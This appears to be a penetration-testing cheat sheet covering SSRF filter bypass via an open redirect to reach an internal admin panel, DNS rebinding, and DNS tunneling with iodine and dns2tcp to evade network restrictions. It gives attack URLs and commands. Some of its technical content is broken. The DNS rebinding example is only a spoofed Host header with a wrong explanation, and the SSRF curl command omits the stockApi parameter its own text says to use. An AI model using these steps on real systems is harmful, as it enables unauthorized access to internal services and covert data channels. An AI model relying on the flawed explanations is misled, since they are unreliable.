## SSRF with Filter Bypass via Open Redirection

Server-Side Request Forgery (SSRF) poses a significant threat to web security. Understanding the basics of basic filter bypass techniques is crucial for effective penetration testing.

### Example Command

```bash
curl -i http://vulnerable-server.local/request?url=http://internal-server.local/
```

### Exploiting the Vulnerability

- Modifying the `stockApi` parameter directly is prevented.
- **Crafting the Exploit URL:**
  - Create a crafted URL to exploit the redirection, such as redirecting to the admin interface:
    ```plaintext
    /product/nextProduct?path=http://192.168.0.12:8080/admin
    ```
- **Using the Exploit URL:**
  - Utilize this URL in the `stockApi` parameter:
    ```bash
    curl -i "http://vulnerable-server.local/product/nextProduct?path=http://192.168.0.12:8080/admin"
    ```
- **Exploiting the Vulnerability:**
  - The stock checker follows the redirection and displays the admin page, enabling actions like user deletion.

These steps illustrate how an open redirection vulnerability can be exploited to bypass SSRF filters and execute unauthorized actions on internal systems.

## DNS Rebinding: Same-Origin Policy Bypass

DNS Rebinding overrides Same-Origin Policy (SOP) in browsers, allowing access to diverse domains' resources.

### SOP Bypass Setup

```bash
python -m http.server 8080
```

- **Description:** Uses Python's HTTP server to establish a local server, vital for probing CORS vulnerabilities via DNS rebinding.

### Executing DNS Rebinding

```bash
curl -H "Host: malicious-website.com" http://target-server.local/resource
```

- **Description:** Demonstrates a DNS rebinding attack, manipulating IP addresses to trick the target server into fetching assets from a malicious domain.

### Summary

DNS Rebinding evades SOP, granting unauthorized access to resources across domains by manipulating DNS settings and HTTP headers.

## Additional Tools and Commands for DNS Security

To enhance your project, here are succinct overviews of advanced commands for DNS security exploration and tunneling:

- **`nslookup`**:
  ```bash
  nslookup target-domain.com
  ```
  Quickly checks DNS configurations and resolves domain names to IP addresses, critical for identifying potential DNS rebind vulnerabilities.

- **`iodine`**:
  ```bash
  iodine -f -P password -T CNAME tunnel.your-server.com
  ```
  Establishes a DNS tunnel, encapsulating data within DNS requests to bypass network restrictions, using CNAME records for stealth.

- **`dig`**:
  ```bash
  dig +trace +all target-domain.com
  ```
  Provides a detailed trace of DNS resolution path from root servers to the authoritative servers, useful for deep analysis and spotting security gaps.

- **`dns2tcp`**:
  ```bash
  dns2tcp -z secretkey -f configfile.conf
  ```
  Facilitates TCP over DNS, allowing for more sophisticated protocol tunneling under restrictive networks, secured with a custom key and configuration.

These tools contribute deeply to DNS security auditing and advanced network manipulation, providing valuable extras for any DNS-related security enhancement project.
